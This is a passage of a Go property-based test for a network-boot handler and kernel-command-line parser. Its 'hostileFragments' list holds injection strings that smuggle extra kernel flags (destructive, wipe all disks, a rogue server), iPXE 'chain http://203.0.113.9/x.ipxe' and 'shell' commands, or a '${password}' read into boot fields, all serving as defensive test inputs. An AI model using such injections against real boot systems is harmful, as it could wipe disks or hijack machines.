//go:build !integration

package main

// Property-based coverage for the boot path from the site worker's boot decision to
// the agent: httpboot renders an iPXE script, iPXE turns its `kernel` line
// into a kernel command line, the initramfs BOOT hook
// (assets/initramfs/scripts/slagworks) and the agent then read that command
// line back.
//
// The tests live in package main because the round trip ends in the
// agent's own cmdline readers (cmdlineValue / cmdlineHas / compareUUIDs),
// which are unexported here.
//
// Shape:
//
//	generated boot case (machine snapshot, op, op params, provider answers)
//	  -> httpboot.Handler.ServeHTTP                       (production)
//	  -> ipxeInterpret                                    (independent model of iPXE's script reader)
//	  -> hookModelParse + the REAL hook function run under sh
//	  -> agent cmdlineValue / cmdlineHas / compareUUIDs   (production)
//	  -> compare with expectation derived only from the generated case
//
// The oracle never calls httpboot helpers: expected tokens are rebuilt from
// the generated inputs and the documented contracts (handler doc comments,
// docs/user/boot-process.md, docs/user/hardware/adding-new-hardware.md).

import (
	"encoding/json"
	"fmt"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"testing"

	"github.com/google/uuid"
	"pgregory.net/rapid"

	"github.com/bluesky-social/slagworks/internal/httpboot"
	"github.com/bluesky-social/slagworks/internal/model"
)

// ---------------------------------------------------------------------------
// Fake provider: answers exactly what the generated case says, including
// inconsistent answers a real cache must never give (an op for another
// machine, a terminal op, an action with no op). The handler is the last
// line of defense before a kernel is served, so it is tested against those.
// ---------------------------------------------------------------------------

type propProvider struct {
	action   model.BootAction
	machines map[string]*model.MachineSnapshot // by MAC as stored
	deploy   map[string]*model.Operation       // by MAC
	commiss  map[string]*model.Operation       // by MAC
	reports  []model.ProgressReport
}

func (p *propProvider) BootActionForMAC(string) model.BootAction { return p.action }
func (p *propProvider) MachineIDForMAC(mac string) (uuid.UUID, bool) {
	if m := p.machines[mac]; m != nil {
		return m.ID, true
	}
	return uuid.Nil, false
}
func (p *propProvider) MachineByMAC(mac string) *model.MachineSnapshot {
	if m := p.machines[mac]; m != nil {
		cp := *m
		return &cp
	}
	return nil
}
func (p *propProvider) MachineByID(id uuid.UUID) *model.MachineSnapshot {
	for _, m := range p.machines {
		if m.ID == id {
			cp := *m
			return &cp
		}
	}
	return nil
}
func (p *propProvider) RecordPhoneHome(uuid.UUID)               {}
func (p *propProvider) RecordInventoryReport(uuid.UUID, []byte) {}
func (p *propProvider) DeployOpForMAC(mac string) *model.Operation {
	if o := p.deploy[mac]; o != nil {
		cp := *o
		return &cp
	}
	return nil
}
func (p *propProvider) CommissionOpForMAC(mac string) *model.Operation {
	if o := p.commiss[mac]; o != nil {
		cp := *o
		return &cp
	}
	return nil
}
func (p *propProvider) GetSSHKeys() []string { return nil }
func (p *propProvider) HandleProgressReport(r *model.ProgressReport) error {
	p.reports = append(p.reports, *r)
	return nil
}

// ---------------------------------------------------------------------------
// Independent model of iPXE's script reader (src/core/exec.c): one command
// per line, '#' comment lines, ${setting} expansion (unknown settings expand
// to the empty string), whitespace tokenization with no quoting, and the
// standalone tokens ";", "&&", "||" terminating a command.
// ---------------------------------------------------------------------------

const (
	propNextServer = "10.9.8.7"
	propHexHyp     = "52-54-00-aa-bb-01"
	propPort       = 8080
	propImage      = "noble-pxe"
)

type ipxeResult struct {
	shebang    bool
	commands   [][]string
	unknownSet []string // ${...} references to settings the boot script has no business reading
}

func cIsSpace(b byte) bool {
	return b == ' ' || b == '\t' || b == '\n' || b == '\v' || b == '\f' || b == '\r'
}

func cFields(s string) []string {
	var out []string
	i := 0
	for i < len(s) {
		for i < len(s) && cIsSpace(s[i]) {
			i++
		}
		if i >= len(s) {
			break
		}
		j := i
		for j < len(s) && !cIsSpace(s[j]) {
			j++
		}
		out = append(out, s[i:j])
		i = j
	}
	return out
}

func ipxeExpand(line string, res *ipxeResult) string {
	var b strings.Builder
	for {
		start := strings.Index(line, "${")
		if start < 0 {
			b.WriteString(line)
			return b.String()
		}
		end := strings.IndexByte(line[start:], '}')
		if end < 0 {
			b.WriteString(line)
			return b.String()
		}
		name := line[start+2 : start+end]
		b.WriteString(line[:start])
		switch name {
		case "next-server":
			b.WriteString(propNextServer)
		case "netX/mac:hexhyp":
			b.WriteString(propHexHyp)
		default:
			res.unknownSet = append(res.unknownSet, name)
		}
		line = line[start+end+1:]
	}
}

func ipxeInterpret(script string) ipxeResult {
	var res ipxeResult
	lines := strings.Split(script, "\n")
	if len(lines) > 0 && strings.TrimRight(lines[0], "\r") == "#!ipxe" {
		res.shebang = true
		lines = lines[1:]
	}
	for _, line := range lines {
		trimmed := strings.TrimLeft(line, " \t\r\v\f")
		if trimmed == "" || trimmed[0] == '#' {
			continue
		}
		toks := cFields(ipxeExpand(line, &res))
		var cur []string
		for _, tok := range toks {
			if tok == ";" || tok == "&&" || tok == "||" {
				if len(cur) > 0 {
					res.commands = append(res.commands, cur)
				}
				cur = nil
				continue
			}
			cur = append(cur, tok)
		}
		if len(cur) > 0 {
			res.commands = append(res.commands, cur)
		}
	}
	return res
}

// commandNames returns the first token of every command.
func (r ipxeResult) commandNames() []string {
	out := make([]string, 0, len(r.commands))
	for _, c := range r.commands {
		out = append(out, c[0])
	}
	return out
}

// kernelCmdline returns the kernel URL and the command line iPXE hands the
// kernel (arguments re-joined with single spaces), or ok=false when the
// script does not contain exactly one kernel command.
func (r ipxeResult) kernelCmdline() (kurl, cmdline string, ok bool) {
	n := 0
	for _, c := range r.commands {
		if c[0] != "kernel" {
			continue
		}
		n++
		if len(c) >= 2 {
			kurl = c[1]
			cmdline = strings.Join(c[2:], " ")
		}
	}
	return kurl, cmdline, n == 1
}

// installerCommands are the iPXE commands that load or start something other
// than the local disk. A boot-local or refusal script must contain none.
var installerCommands = map[string]bool{
	"kernel": true, "initrd": true, "chain": true, "imgfetch": true, "imgexec": true,
	"imgload": true, "module": true, "boot": true,
}

// ---------------------------------------------------------------------------
// Independent model of the BOOT hook's slagworks_parse_cmdline: /proc/cmdline
// split on shell IFS whitespace, last occurrence of each key wins, bare flags
// match exactly.
// ---------------------------------------------------------------------------

type hookView struct {
	Server, Image, Mode   string
	Destructive, WipeAll  bool
	Machine, Op, Trace    string
	ExpectUUID            string
	Recovery              bool
	FatalAt, EfivarfsMode string
}

func shellFields(s string) []string {
	return strings.FieldsFunc(s, func(r rune) bool { return r == ' ' || r == '\t' || r == '\n' })
}

func hookModelParse(cmdline string) hookView {
	v := hookView{Mode: "deploy", EfivarfsMode: "auto"}
	for _, p := range shellFields(cmdline) {
		switch {
		case strings.HasPrefix(p, "slagworks.server="):
			v.Server = strings.TrimPrefix(p, "slagworks.server=")
		case strings.HasPrefix(p, "slagworks.image="):
			v.Image = strings.TrimPrefix(p, "slagworks.image=")
		case strings.HasPrefix(p, "slagworks.mode="):
			v.Mode = strings.TrimPrefix(p, "slagworks.mode=")
		case p == "slagworks.destructive":
			v.Destructive = true
		case p == "slagworks.wipe_all_disks":
			v.WipeAll = true
		case strings.HasPrefix(p, "slagworks.machine="):
			v.Machine = strings.TrimPrefix(p, "slagworks.machine=")
		case strings.HasPrefix(p, "slagworks.op="):
			v.Op = strings.TrimPrefix(p, "slagworks.op=")
		case strings.HasPrefix(p, "slagworks.trace="):
			v.Trace = strings.TrimPrefix(p, "slagworks.trace=")
		case strings.HasPrefix(p, "slagworks.expect-uuid="):
			v.ExpectUUID = strings.TrimPrefix(p, "slagworks.expect-uuid=")
		case p == "slagworks.recovery":
			v.Recovery = true
		case strings.HasPrefix(p, "slagworks.fatal_at="):
			v.FatalAt = strings.TrimPrefix(p, "slagworks.fatal_at=")
		case strings.HasPrefix(p, "slagworks.efivarfs="):
			v.EfivarfsMode = strings.TrimPrefix(p, "slagworks.efivarfs=")
		}
	}
	return v
}

// ---------------------------------------------------------------------------
// The real hook function, extracted from the asset and run under /bin/sh with
// `cat /proc/cmdline` redirected to a file. This is production code on the
// consuming side of the round trip; hookModelParse is checked against it.
// ---------------------------------------------------------------------------

var (
	hookFnOnce sync.Once
	hookFnText string
	hookFnErr  error
)

func realHookFunction() (string, error) {
	hookFnOnce.Do(func() {
		path := filepath.Join("..", "..", "assets", "initramfs", "scripts", "slagworks")
		data, err := os.ReadFile(path)
		if err != nil {
			hookFnErr = err
			return
		}
		src := string(data)
		start := strings.Index(src, "slagworks_parse_cmdline() {")
		if start < 0 {
			hookFnErr = fmt.Errorf("slagworks_parse_cmdline not found in %s", path)
			return
		}
		end := strings.Index(src[start:], "\n}\n")
		if end < 0 {
			hookFnErr = fmt.Errorf("end of slagworks_parse_cmdline not found in %s", path)
			return
		}
		hookFnText = src[start : start+end+3]
	})
	return hookFnText, hookFnErr
}

// runRealHook executes the production slagworks_parse_cmdline against
// cmdline and returns what it parsed. panicked is true when the hook dropped
// to its panic shell (no slagworks.server=).
func runRealHook(cmdline string) (v hookView, panicked bool, err error) {
	fn, err := realHookFunction()
	if err != nil {
		return v, false, fmt.Errorf("load hook: %w", err)
	}
	dir, err := os.MkdirTemp("", "hookprop")
	if err != nil {
		return v, false, err
	}
	defer os.RemoveAll(dir)
	cmdFile := filepath.Join(dir, "cmdline")
	// /proc/cmdline always ends in a newline.
	if err := os.WriteFile(cmdFile, []byte(cmdline+"\n"), 0o600); err != nil {
		return v, false, err
	}
	empty := filepath.Join(dir, "cwd")
	if err := os.Mkdir(empty, 0o700); err != nil {
		return v, false, err
	}
	script := `
_step() { :; }
slagworks_panic_shell() { printf 'PANIC\n'; exit 97; }
cat() { command cat "$HOOK_CMDLINE_FILE"; }
` + fn + `
slagworks_parse_cmdline >/dev/null
printf 'server\t%s\n' "$SLAG_SERVER"
printf 'image\t%s\n' "$SLAG_IMAGE"
printf 'mode\t%s\n' "$SLAG_MODE"
printf 'destructive\t%s\n' "$SLAG_DESTRUCTIVE"
printf 'wipe\t%s\n' "$SLAG_WIPE_ALL_DISKS"
printf 'machine\t%s\n' "$SLAG_MACHINE_ID"
printf 'op\t%s\n' "$SLAG_OP_ID"
printf 'trace\t%s\n' "$SLAG_TRACE_ID"
printf 'expect\t%s\n' "$SLAG_EXPECT_UUID"
printf 'recovery\t%s\n' "$SLAG_RECOVERY"
printf 'fatal_at\t%s\n' "$SLAG_FATAL_AT"
printf 'efivarfs\t%s\n' "$SLAG_EFIVARFS_MODE"
`
	cmd := exec.Command("/bin/sh", "-c", script)
	cmd.Dir = empty
	cmd.Env = []string{"HOOK_CMDLINE_FILE=" + cmdFile, "PATH=/usr/bin:/bin"}
	out, err := cmd.Output()
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok && ee.ExitCode() == 97 {
			return hookView{}, true, nil
		}
		stderr := ""
		if ee, ok := err.(*exec.ExitError); ok {
			stderr = string(ee.Stderr)
		}
		return v, false, fmt.Errorf("run hook: %w (stderr: %s)", err, stderr)
	}
	got := map[string]string{}
	for _, line := range strings.Split(strings.TrimRight(string(out), "\n"), "\n") {
		k, val, ok := strings.Cut(line, "\t")
		if !ok {
			return v, false, fmt.Errorf("unparseable hook output line %q (full output %q)", line, out)
		}
		got[k] = val
	}
	return hookView{
		Server: got["server"], Image: got["image"], Mode: got["mode"],
		Destructive: got["destructive"] == "--destructive",
		WipeAll:     got["wipe"] == "--wipe-all-disks",
		Machine:     got["machine"], Op: got["op"], Trace: got["trace"],
		ExpectUUID: got["expect"], Recovery: got["recovery"] == "1",
		FatalAt: got["fatal_at"], EfivarfsMode: got["efivarfs"],
	}, false, nil
}

// ---------------------------------------------------------------------------
// Generators
// ---------------------------------------------------------------------------

// textValue is a generated free-text value plus whether it lies inside the
// documented value space of its field. For a benign value the boot path must
// deliver it exactly. For a hostile value the boot path must either deliver
// it exactly or refuse to serve an installer; it must never deliver
// something else.
type textValue struct {
	v      string
	benign bool
}

// hostileFragments are spliced into otherwise plausible values. Each one is a
// distinct way to break out of a single kernel-argument token or a single
// iPXE script line.
var hostileFragments = []string{
	" slagworks.destructive",
	" slagworks.wipe_all_disks",
	"\tslagworks.destructive",
	"\nslagworks.destructive",
	" slagworks.recovery",
	" slagworks.machine=00000000-0000-4000-8000-00000000dead",
	" slagworks.op=00000000-0000-4000-8000-00000000dead",
	" slagworks.server=203.0.113.9:8080",
	" slagworks.expect-uuid=00000000-0000-4000-8000-00000000dead",
	" slagworks.mode=commission",
	" slagworks.oob=amt",
	" slagworks.no_reboot",
	" slagworks.fatal_at=partitioning",
	"\nchain http://203.0.113.9/x.ipxe",
	"\nshell",
	" || chain http://203.0.113.9/x.ipxe",
	" && shell",
	" ; shell",
	"${net0/mac}",
	"${password}",
	"${",
	" ",
	"\t",
	"\r",
	"\"",
	"'",
	"=",
	"\u00a0slagworks.destructive", // NBSP: strings.Fields splits here, sh does not
	"\u2028",
	"\u00e9",
	"\x00",
	"#",
	"*",
	"\\",
}

var genHostileFragment = rapid.SampledFrom(hostileFragments)

// hostile wraps a benign base value with 1..3 hostile fragments at random
// positions.
func hostile(t *rapid.T, label, base string) string {
	n := rapid.IntRange(1, 3).Draw(t, label+"_nfrag")
	s := base
	for i := 0; i < n; i++ {
		frag := genHostileFragment.Draw(t, label+"_frag")
		pos := rapid.IntRange(0, len(s)).Draw(t, label+"_pos")
		s = s[:pos] + frag + s[pos:]
	}
	if rapid.IntRange(0, 9).Draw(t, label+"_long") == 0 {
		s += strings.Repeat("A", rapid.IntRange(1000, 5000).Draw(t, label+"_len"))
	}
	return s
}

// isSingleSafeToken reports whether v can ride as the value of one
// key=value kernel argument through iPXE, the kernel, the hook and the
// agent without any encoding: non-empty, printable ASCII, no whitespace, no
// double quote (the kernel joins quoted arguments), no backslash (a trailing
// one joins the next script line onto the kernel line), no iPXE settings
// reference.
func isSingleSafeToken(v string) bool {
	if v == "" || strings.Contains(v, "${") {
		return false
	}
	for i := 0; i < len(v); i++ {
		if v[i] <= ' ' || v[i] >= 0x7f || v[i] == '"' || v[i] == '\\' {
			return false
		}
	}
	return true
}

// rfc1123Hostname is the documented shape of a tailnet hostname: labels of
// letters, digits and hyphens, 1-63 characters each, not starting or ending
// with a hyphen, joined by dots.
var rfc1123Hostname = regexp.MustCompile(
	`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$`)

func isHostname(v string) bool {
	return len(v) <= 253 && rfc1123Hostname.MatchString(v)
}

// kernelParamsCarryAgentArgs reports whether a word of the kernel params is
// itself a slagworks.* argument.
func kernelParamsCarryAgentArgs(kp string) bool {
	for _, w := range strings.Fields(kp) {
		if strings.HasPrefix(w, "slagworks.") {
			return true
		}
	}
	return false
}

func genIdent(label string, alphabet string, minLen, maxLen int) *rapid.Generator[string] {
	return rapid.Custom(func(t *rapid.T) string {
		n := rapid.IntRange(minLen, maxLen).Draw(t, label+"_n")
		b := make([]byte, n)
		for i := range b {
			b[i] = alphabet[rapid.IntRange(0, len(alphabet)-1).Draw(t, label+"_c")]
		}
		return string(b)
	})
}

const (
	alnum      = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	lowerAlnum = "abcdefghijklmnopqrstuvwxyz0123456789"
)

// benignKernelParams are values an operator would put in the NetBox
// device-type custom field per docs/user/hardware/adding-new-hardware.md
// ("verbatim kernel cmdline"), plus the "none" sentinel.
var benignKernelParams = []string{
	"none",
	"console=ttyS1,115200n8",
	"console=ttyS0,115200n8",
	"console=ttyS1,115200n8 console=ttyS0,115200n8",
	"console=ttyS0,57600n8",
	"console=ttyS1,115200n8 nomodeset",
	"console=ttyS1,115200n8 intel_iommu=on iommu=pt",
	"console=ttyS1,115200n8 pci=realloc=off",
	"console=hvc0",
}

// genKernelParams returns the device-type value. class is one of "empty",
// "benign", "hostile".
func genKernelParams(t *rapid.T, allowHostile bool) (textValue, string) {
	max := 9
	if allowHostile {
		max = 13
	}
	switch k := rapid.IntRange(0, max).Draw(t, "kp_class"); {
	case k == 0:
		return textValue{"", true}, "empty"
	case k <= 9:
		return textValue{rapid.SampledFrom(benignKernelParams).Draw(t, "kp"), true}, "benign"
	default:
		base := rapid.SampledFrom(benignKernelParams[1:]).Draw(t, "kp_base")
		return textValue{hostile(t, "kp", base), false}, "hostile"
	}
}

func genOptText(t *rapid.T, label string, benign *rapid.Generator[string], allowHostile bool) textValue {
	max := 5
	if allowHostile {
		max = 8
	}
	switch k := rapid.IntRange(0, max).Draw(t, label+"_class"); {
	case k <= 1:
		return textValue{"", true}
	case k <= 5:
		return textValue{benign.Draw(t, label), true}
	default:
		v := hostile(t, label, benign.Draw(t, label+"_base"))
		// The handler puts no bound on the kernel command line: a
		// single-token value long enough to push the line past the
		// kernel's 2047 bytes is served, the kernel drops the tail, and
		// the agent then refuses the deploy for want of
		// slagworks.expect-uuid. A value that long is therefore not
		// counted as one the boot path must deliver.
		return textValue{v, isSingleSafeToken(v) && len(v) <= maxDeliverableValue}
	}
}

// maxDeliverableValue is the longest free-text value checkBootCase requires
// the boot path to deliver. The longest value a generator draws on purpose
// (an auth key) is 68 bytes.
const maxDeliverableValue = 256

var (
	genAuthKey = rapid.Custom(func(t *rapid.T) string {
		return "tskey-auth-" + genIdent("ak1", alnum, 8, 16).Draw(t, "ak_id") + "-" +
			genIdent("ak2", alnum, 16, 40).Draw(t, "ak_secret")
	})
	genTSHostname = rapid.Custom(func(t *rapid.T) string {
		return genIdent("host", lowerAlnum, 1, 12).Draw(t, "ts_short") + "-" +
			rapid.SampledFrom([]string{"pop1", "pop2", "pop3"}).Draw(t, "ts_pop")
	})
	genPhase  = rapid.SampledFrom([]string{"partitioning", "installing_bootloader", "agent_starting", "bmc_reconcile"})
	genEfivar = rapid.SampledFrom([]string{"skip", "auto"})
	genMarker = genIdent("marker", alnum+"-_.", 1, 24)
	// BMC account names: IPMI allows 16 bytes of anything. The handler doc
	// promises the value is encoded, so every string is in the value space.
	genBMCUser = rapid.OneOf(
		rapid.SampledFrom([]string{"ADMIN", "admin", "root", "Administrator", "slagworks"}),
		rapid.StringN(1, 16, 64),
		// Hostile fragments without the long tail: account names are short.
		rapid.Custom(func(t *rapid.T) string {
			return rapid.SampledFrom(hostileFragments).Draw(t, "bmc_frag") + "ADMIN" +
				rapid.SampledFrom(hostileFragments).Draw(t, "bmc_frag2")
		}),
	)
)

// genSystemUUID returns the persisted SMBIOS UUID. Benign forms are the ones
// snapshot preflight accepts (uuid.Parse after TrimSpace; the snapshot
// builder already trims).
func genSystemUUID(t *rapid.T, canonical uuid.UUID, allowHostile bool) textValue {
	max := 6
	if allowHostile {
		max = 9
	}
	c := canonical.String()
	switch k := rapid.IntRange(0, max).Draw(t, "uuid_class"); {
	case k == 0:
		return textValue{"", true}
	case k <= 3:
		return textValue{c, true}
	case k == 4:
		return textValue{strings.ToUpper(c), true}
	case k == 5:
		return textValue{"{" + c + "}", true}
	case k == 6:
		return textValue{strings.ReplaceAll(c, "-", ""), true}
	default:
		// Never benign: preflight (uuid.Parse) rejects every mangled form
		// that still fits in one token, so exact delivery or refusal are
		// the only acceptable outcomes.
		return textValue{hostile(t, "uuid", c), false}
	}
}

type bootCase struct {
	// provider answers
	action     model.BootAction
	deployMode bool
	image      string
	platform   string
	reqMAC     string

	machineKnown bool
	machine      model.MachineSnapshot
	hardwareUUID uuid.UUID // what dmidecode reports on the real box

	opPresent bool
	op        model.Operation
	opType    model.OperationType
	// opBound is true when op names this machine, has the type the action
	// needs, a non-nil ID and a non-terminal status.
	opBound bool

	paramsValid bool
	params      model.OpParams

	kp       textValue
	kpClass  string
	sysUUID  textValue
	fatalAt  textValue
	efivarfs textValue
	marker   textValue
	authKey  textValue
	tsHost   textValue
	bmcUser  string // effective admin account name, "" when none
}

type genOpts struct {
	hostileKP, hostileUUID, hostileKnobs, hostileTailscale bool
	// inconsistentProvider lets the fake provider hand back ops that do not
	// belong to the machine, terminal ops, absent ops and unknown machines.
	inconsistentProvider bool
}

var propMACs = []string{"52:54:00:aa:bb:01", "52:54:00:aa:bb:02"}

func genBootCase(t *rapid.T, o genOpts) bootCase {
	var c bootCase
	c.action = rapid.SampledFrom([]model.BootAction{
		model.BootDeploy, model.BootDeploy, model.BootDeploy, model.BootCommission, model.BootCommission, model.BootLocal,
	}).Draw(t, "action")
	c.deployMode = true
	c.image = propImage
	c.platform = rapid.SampledFrom([]string{"", "efi", "pcbios", "weird"}).Draw(t, "platform")
	c.reqMAC = propMACs[0]

	machineID := uuid.MustParse(rapid.SampledFrom([]string{
		"11111111-1111-4111-8111-111111111111",
		"22222222-2222-4222-8222-222222222222",
	}).Draw(t, "machine_id"))
	otherMachineID := uuid.MustParse("99999999-9999-4999-8999-999999999999")
	c.hardwareUUID = uuid.MustParse(rapid.SampledFrom([]string{
		"4c4c4544-0042-3510-8051-b4c04f4a4433",
		"03000200-0400-0500-0006-000700080009",
	}).Draw(t, "hw_uuid"))

	c.machineKnown = true
	c.kp, c.kpClass = genKernelParams(t, o.hostileKP)
	c.sysUUID = genSystemUUID(t, c.hardwareUUID, o.hostileUUID)
	amt := rapid.IntRange(0, 4).Draw(t, "amt") == 0
	snapUser := ""
	if rapid.Bool().Draw(t, "snap_bmc_user") {
		snapUser = genBMCUser.Draw(t, "snap_user")
	}
	c.machine = model.MachineSnapshot{
		ID:           machineID,
		State:        model.MachineStateDeploying,
		PXEEligible:  true,
		KernelParams: c.kp.v,
		SystemUUID:   c.sysUUID.v,
		AMT:          amt,
		BMCUser:      snapUser,
	}

	switch c.action {
	case model.BootDeploy:
		c.opType = model.OpDeploy
	case model.BootCommission:
		c.opType = model.OpCommission
	case model.BootLocal:
		c.opType = rapid.SampledFrom([]model.OperationType{model.OpDeploy, model.OpCommission}).Draw(t, "local_op_type")
	}

	c.opPresent = true
	c.opBound = true
	c.op = model.Operation{
		ID: uuid.MustParse(rapid.SampledFrom([]string{
			"aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
			"bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
		}).Draw(t, "op_id")),
		MachineID: machineID,
		Type:      c.opType,
		Status:    rapid.SampledFrom([]model.OperationStatus{model.OpPending, model.OpClaimed, model.OpRunning}).Draw(t, "op_status"),
	}
	if rapid.Bool().Draw(t, "has_trace") {
		c.op.TraceID = uuid.MustParse("cccccccc-cccc-4ccc-8ccc-cccccccccccc")
	}

	if o.inconsistentProvider {
		switch rapid.IntRange(0, 29).Draw(t, "binding_fault") {
		case 0:
			c.opPresent, c.opBound = false, false
		case 1:
			c.op.MachineID, c.opBound = otherMachineID, false
		case 2:
			c.op.Status = rapid.SampledFrom([]model.OperationStatus{model.OpCompleted, model.OpFailed}).Draw(t, "terminal")
			c.opBound = false
		case 3:
			if c.op.Type == model.OpDeploy {
				c.op.Type = model.OpCommission
			} else {
				c.op.Type = model.OpDeploy
			}
			c.opBound = false
		case 4:
			c.op.ID, c.opBound = uuid.Nil, false
		case 5:
			c.machineKnown, c.opBound = false, false
		default:
		}
	}

	// Op params: only meaningful for deploy, but generated for every op so a
	// commission op carrying deploy flags is exercised too.
	c.paramsValid = true
	c.params.Destructive = rapid.Bool().Draw(t, "destructive")
	c.params.WipeAllDisks = rapid.Bool().Draw(t, "wipe_all")
	c.params.Recovery = rapid.IntRange(0, 5).Draw(t, "recovery") == 0
	c.fatalAt = genOptText(t, "fatal_at", genPhase, o.hostileKnobs)
	c.efivarfs = genOptText(t, "efivarfs", genEfivar, o.hostileKnobs)
	c.marker = genOptText(t, "marker", genMarker, o.hostileKnobs)
	c.params.FatalAt, c.params.Efivarfs, c.params.DataMarker = c.fatalAt.v, c.efivarfs.v, c.marker.v

	c.authKey = genOptText(t, "authkey", genAuthKey, o.hostileTailscale)
	c.tsHost = genOptText(t, "tshost", genTSHostname, o.hostileTailscale)
	if c.authKey.v != "" || c.tsHost.v != "" || rapid.Bool().Draw(t, "ts_block") {
		c.params.TailscaleRuntime = &model.TailscaleRuntime{AuthKey: c.authKey.v, Hostname: c.tsHost.v, Tags: []string{"tag:pop2"}}
	}

	rtUser := ""
	if rapid.Bool().Draw(t, "has_bmc_runtime") {
		if rapid.Bool().Draw(t, "rt_has_user") {
			rtUser = genBMCUser.Draw(t, "rt_user")
		}
		c.params.BMCRuntime = &model.BMCRuntime{
			ExpectedChassisSerial: "SER123", Username: rtUser, Password: "hunter2-not-on-cmdline",
			ExtraConfig: map[string]any{},
		}
	}
	// Documented precedence (bmcAdminUserKernelArg doc): bmc_runtime name,
	// else the snapshot's; nothing for an AMT machine.
	switch {
	case amt:
		c.bmcUser = ""
	case rtUser != "":
		c.bmcUser = rtUser
	default:
		c.bmcUser = snapUser
	}

	raw, err := json.Marshal(c.params)
	if err != nil {
		t.Fatalf("marshal params: %v", err)
	}
	c.op.Params = raw
	return c
}

func (c bootCase) provider() *propProvider {
	p := &propProvider{
		action:   c.action,
		machines: map[string]*model.MachineSnapshot{},
		deploy:   map[string]*model.Operation{},
		commiss:  map[string]*model.Operation{},
	}
	if c.machineKnown {
		m := c.machine
		p.machines[c.reqMAC] = &m
	}
	if c.opPresent {
		op := c.op
		// The fake hands the op back from whichever lookup the action
		// consults, whatever the op's own Type says: a provider bug must not
		// become a served installer.
		switch c.opType {
		case model.OpDeploy:
			p.deploy[c.reqMAC] = &op
		default:
			p.commiss[c.reqMAC] = &op
		}
	}
	return p
}

func (c bootCase) render() (string, *propProvider, error) {
	prov := c.provider()
	h := httpboot.NewHandler(httpboot.HandlerConfig{
		DefaultImage: c.image, HTTPPort: propPort, DeployMode: c.deployMode,
	}, prov)
	q := url.Values{}
	q.Set("mac", c.reqMAC)
	if c.platform != "" {
		q.Set("platform", c.platform)
	}
	req := httptest.NewRequest("GET", "/boot/ipxe?"+q.Encode(), nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != 200 {
		return "", nil, fmt.Errorf("boot script status %d: %s", w.Code, w.Body.String())
	}
	return w.Body.String(), prov, nil
}

// ---------------------------------------------------------------------------
// Oracle
// ---------------------------------------------------------------------------

// expectation is what the generated case must produce, derived only from the
// case.
type expectation struct {
	// mustServe: the documented preconditions hold and every value is in its
	// documented value space, so an installer must be served.
	mustServe bool
	// mayServe: an installer may be served (preconditions hold) but refusing
	// is also acceptable because some value is hostile.
	mayServe bool
	// tokens is the exact multiset of kernel arguments an installer boot
	// must carry (bmc_admin_user excluded: its encoding is checked by
	// decoding).
	tokens []string
	hook   hookView
	// tailscale: the auth key (and the hostname, when there is one) ride the
	// command line. False when there is no key, and when the hostname is not
	// a hostname: enrollment is then skipped, not the deploy.
	tailscale bool
	// kpAgentArgs: the kernel params carry slagworks.* words of their own.
	kpAgentArgs bool
}

func (c bootCase) expect() expectation {
	var e expectation
	if c.action == model.BootLocal {
		return e
	}
	if !c.machineKnown || !c.opPresent || !c.opBound {
		return e
	}
	deploy := c.action == model.BootDeploy
	// The field means the same with or without surrounding whitespace (a
	// YAML block scalar written through the NetBox API leaves a newline).
	kp := strings.TrimSpace(c.kp.v)
	// Deploy preconditions: a configured console (docs: "the boot handler
	// refuses to serve a deploy boot script" on an empty field) and a
	// commissioned machine (non-empty system UUID).
	if deploy && (kp == "" || c.sysUUID.v == "") {
		return e
	}
	e.mayServe = true
	e.kpAgentArgs = kernelParamsCarryAgentArgs(kp)

	server := fmt.Sprintf("%s:%d", propNextServer, propPort)
	var toks []string
	switch {
	case kp == "none":
	case kp == "":
		// Commission determination boot: broadcast to every sweep candidate.
		toks = append(toks, "console=tty0", "console=ttyS0,115200n8", "console=ttyS1,115200n8")
	default:
		// "verbatim kernel cmdline": each whitespace-separated word of the
		// field is one kernel argument, after the fixed tty0 console.
		toks = append(toks, "console=tty0")
		toks = append(toks, shellFields(kp)...)
	}
	toks = append(toks,
		"BOOTIF=01-"+propHexHyp, "boot=slagworks", "ip=dhcp",
		"slagworks.server="+server, "slagworks.image="+c.image,
		"slagworks.machine="+c.machine.ID.String(), "slagworks.op="+c.op.ID.String(),
	)
	e.hook = hookView{
		Server: server, Image: c.image, Mode: "deploy", EfivarfsMode: "auto",
		Machine: c.machine.ID.String(), Op: c.op.ID.String(),
	}
	if c.op.TraceID != uuid.Nil {
		toks = append(toks, "slagworks.trace="+c.op.TraceID.String())
		e.hook.Trace = c.op.TraceID.String()
	}
	if c.machine.AMT {
		toks = append(toks, "slagworks.oob=amt")
	}
	allBenign := c.kp.benign
	if !deploy {
		toks = append(toks, "slagworks.mode=commission")
		e.hook.Mode = "commission"
	} else {
		if c.params.Destructive {
			toks = append(toks, "slagworks.destructive")
			e.hook.Destructive = true
		}
		if c.params.WipeAllDisks {
			toks = append(toks, "slagworks.wipe_all_disks")
			e.hook.WipeAll = true
		}
		if c.params.Recovery {
			toks = append(toks, "slagworks.recovery")
			e.hook.Recovery = true
		}
		if c.fatalAt.v != "" {
			toks = append(toks, "slagworks.fatal_at="+c.fatalAt.v)
			e.hook.FatalAt = c.fatalAt.v
		}
		if c.efivarfs.v != "" {
			toks = append(toks, "slagworks.efivarfs="+c.efivarfs.v)
			e.hook.EfivarfsMode = c.efivarfs.v
		}
		if c.marker.v != "" {
			toks = append(toks, "slagworks.data_marker="+c.marker.v)
		}
		// Both tailscale arguments or neither: a hostname that is not a
		// hostname drops the pair, so the agent skips enrollment.
		e.tailscale = c.authKey.v != "" && (c.tsHost.v == "" || isHostname(c.tsHost.v))
		if e.tailscale {
			toks = append(toks, "slagworks.tailscale_authkey="+c.authKey.v)
			if c.tsHost.v != "" {
				toks = append(toks, "slagworks.tailscale_hostname="+c.tsHost.v)
			}
		}
		toks = append(toks, "slagworks.expect-uuid="+c.sysUUID.v)
		e.hook.ExpectUUID = c.sysUUID.v
		allBenign = allBenign && c.sysUUID.benign && c.fatalAt.benign && c.efivarfs.benign &&
